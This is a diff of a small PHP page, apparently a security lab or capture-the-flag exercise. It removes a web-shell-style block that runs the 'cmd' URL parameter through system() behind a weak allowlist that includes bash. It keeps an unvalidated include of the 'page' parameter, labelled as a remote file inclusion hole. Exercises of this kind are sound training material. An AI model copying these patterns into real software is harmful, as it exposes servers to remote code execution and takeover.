@@ -1,48 +1,10 @@
 <?php
-$output = '';
-
-if (isset($_GET['cmd'])) {
-    $allowed_cmds = ['ls', 'cat', 'whoami', 'id', 'bash'];
-    $denied_cat_targets = ['shell.sh', 'scr.sh']; // file yang tidak boleh dibaca
-
-    $cmd = trim($_GET['cmd']);
-    $cmd_parts = explode(' ', $cmd);
-    $cmd_base = $cmd_parts[0];
-
-    if (in_array($cmd_base, $allowed_cmds)) {
-        // Blok khusus untuk 'cat' dan blacklist file tertentu
-        if ($cmd_base === 'cat') {
-            $is_denied = false;
-            foreach ($denied_cat_targets as $deny) {
-                if (strpos($cmd, $deny) !== false) {
-                    $is_denied = true;
-                    break;
-                }
-            }
-
-            if ($is_denied) {
-                $output = "gk_boleh_cat_file_terlarang";
-            } else {
-                ob_start();
-                system($cmd);
-                $output = ob_get_clean();
-            }
-        } else {
-            // command selain 'cat'
-            ob_start();
-            system($cmd);
-            $output = ob_get_clean();
-        }
-    } else {
-        $output = "gk_boleh";
-    }
-} elseif (isset($_GET['page'])) {
-    ob_start();
+// RFI vulnerability here
+if (isset($_GET['page'])) {
     include($_GET['page']);
-    $output = ob_get_clean();
+    exit;
 }
 ?>
-
 
 <!DOCTYPE html>
 <html lang="en">
